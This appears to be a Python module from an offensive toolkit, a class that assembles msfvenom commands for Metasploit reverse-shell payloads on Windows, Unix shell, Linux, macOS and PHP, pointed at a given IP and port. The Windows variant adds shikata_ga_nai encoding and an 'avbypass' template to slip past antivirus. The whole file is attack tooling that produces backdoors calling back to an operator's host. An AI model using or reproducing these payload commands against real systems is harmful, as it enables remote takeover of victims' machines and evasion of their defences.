import tempfile

class msfCrafting(object):
    """Class for crafting Metasploit payloads."""
    def __init__(self, plat: str, ip: str, port: str):
        """
        Initialize an msfCrafting object with platform (plat), IP address (ip), and port.

        :param plat: The platform for which the payload is to be created.
        :param ip: The IP address to be used in the payload.
        :param port: The port number to be used in the payload.
        """
        self.venomcmd: str = ''
        self.plat: str = plat
        self.ip: str = ip
        self.port: str = port
        self.file: str = ''

    def createPayload(self, payload_type: str, venom_cmd_template: str, file_extension: str) -> None:
        """
        Create a Metasploit payload for a specific platform.

        :param payload_type: The platform for which the payload is to be created.
        :param venom_cmd_template: The Metasploit command template for payload generation.
        :param file_extension: The file extension for the temporary payload file.
        """
        with tempfile.NamedTemporaryFile(suffix=file_extension, delete=False) as temp_file:
            self.venomcmd = venom_cmd_template.format(self.ip, self.port, temp_file.name)
            self.file = temp_file.name  # Store the temporary file path.

    def createWindowsPayload(self) -> None:
        """Create a Metasploit payload for Windows platform."""
        self.createPayload(
            'windows',
            "msfvenom -p windows/meterpreter/reverse_tcp LHOST={} LPORT={} --encoder /x86/shikata_ga_nai -x /usr/share/metasploit-framework/data/templates/src/pe/exe/avbypass.exe -f exe -o {}",
            '.exe'
        )

    def createShPayload(self) -> None:
        """Create a Metasploit payload for Unix shell."""
        self.createPayload(
            'sh',
            "msfvenom -p cmd/unix/reverse_bash LHOST={} LPORT={} -f raw -o {}",
            '.sh'
        )

    def createLinuxPayload(self) -> None:
        """Create a Metasploit payload for Linux platform."""
        self.createPayload(
            'linux',
            "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={} LPORT={} -f elf -o {}",
            '.elf'
        )

    def createOsxPayload(self) -> None:
        """Create a Metasploit payload for macOS platform."""
        self.createPayload(
            'macos',
            "msfvenom -p osx/x86/shell_reverse_tcp LHOST={} LPORT={} -f macho -o {}",
            '.macho'
        )

    def createPhpPayload(self) -> None:
        """Create a Metasploit payload for PHP."""
        self.createPayload(
            'web',
            "msfvenom -p php/reverse_php LHOST={} LPORT={} -f raw -o {}",
            '.php'
        )

    def run(self) -> None:
        """Run the appropriate payload creation method based on the platform (plat)."""
        platform_functions = {
            'windows': self.createWindowsPayload,
            'sh': self.createShPayload,
            'linux': self.createLinuxPayload,
            'macos': self.createOsxPayload,
            'web': self.createPhpPayload,
        }
        if self.plat in platform_functions:
            platform_functions[self.plat]()

    def getPayloadFile(self) -> str:
        """
        Get the path of the temporary payload file.

        :return: The path of the temporary payload file.
        """
        return self.file

    def getPayloadCmd(self) -> str:
        """
        Get the Metasploit command used for payload generation.

        :return: The Metasploit command for payload generation.
        """
        return self.venomcmd
